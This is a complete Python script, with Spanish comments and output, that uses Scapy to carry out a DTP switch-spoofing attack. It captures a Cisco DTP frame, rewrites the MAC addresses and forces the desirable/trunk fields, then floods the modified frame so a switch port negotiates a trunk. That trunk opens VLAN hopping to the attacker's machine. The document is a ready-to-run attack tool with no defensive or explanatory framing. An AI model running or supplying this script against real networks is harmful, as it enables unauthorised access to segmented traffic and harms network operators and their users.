#!/usr/bin/env python3
import time
from scapy.all import *
from scapy.contrib.dtp import *

def atacar_dtp_reflejado(interfaz="eth0"):
    print(f"[*] Escuchando paquetes DTP del switch en {interfaz}...")
    print("[*] Presiona Ctrl+C si no hay tráfico después de 40s (el intervalo DTP es 30s).")
    
    # 1. Capturar UN paquete DTP válido enviado por el switch
    # Filtramos por la MAC multicast de DTP
    pkt = sniff(iface=interfaz, filter="ether dst 01:00:0c:cc:cc:cc", count=1, timeout=40)
    
    # VALIDACIÓN 1: Verificar si la lista de paquetes está vacía
    if not pkt or len(pkt) == 0:
        print("[-] Error: No se recibió ningún paquete DTP dentro del tiempo límite.")
        print("[-] Verifica que el switch tenga DTP habilitado y estés conectado al puerto correcto.")
        return

    paquete_original = pkt[0]
    
    # VALIDACIÓN 2: Verificar si el paquete contiene la capa Ethernet
    if not paquete_original.haslayer(Ether):
        print("[-] Error: El paquete capturado no contiene una capa Ethernet válida.")
        print("[-] Asegúrate de estar ejecutando el script como ROOT (sudo).")
        return

    print("[+] Paquete DTP capturado exitosamente.")
    
    # 2. Modificar el paquete para el ataque
    # Cambiamos la MAC de origen a la de tu máquina atacante
    paquete_original[Ether].src = get_if_hwaddr(interfaz)
    
    # Forzamos el estado a "Dynamic Desirable" (0x03)
    if DTP in paquete_original and DTPStatus in paquete_original[DTP]:
        paquete_original[DTP][DTPStatus].status = b'\x03'  # 0x03 = Desirable
        # Forzamos el tipo a Trunk (0xa5)
        paquete_original[DTP][DTPType].dtptype = b'\xa5'
        
        # Actualizamos la MAC del vecino
        if DTPNeighbor in paquete_original[DTP]:
            paquete_original[DTP][DTPNeighbor].neighbor = get_if_hwaddr(interfaz)

    print("[*] Iniciando inundación de paquetes DTP modificados (Desirable/Trunk)...")
    
    try:
        # 3. Enviar constantemente
        while True:
            sendp(paquete_original, iface=interfaz, verbose=False)
            print("[+] Trama DTP inyectada (Modo: Desirable).", end="\r")
            time.sleep(5) 
    except KeyboardInterrupt:
        print("\n[-] Ataque detenido.")

if __name__ == "__main__":
    # Validación básica de seguridad (Root)
    import os
    if os.getuid() != 0:
        print("[-] ¡ERROR! Este script requiere privilegios de administrador.")
        print("[*] Por favor, ejecútalo usando: sudo python3 Ataque_DTP.py")
        exit(1)
        
    atacar_dtp_reflejado(interfaz="eth0")
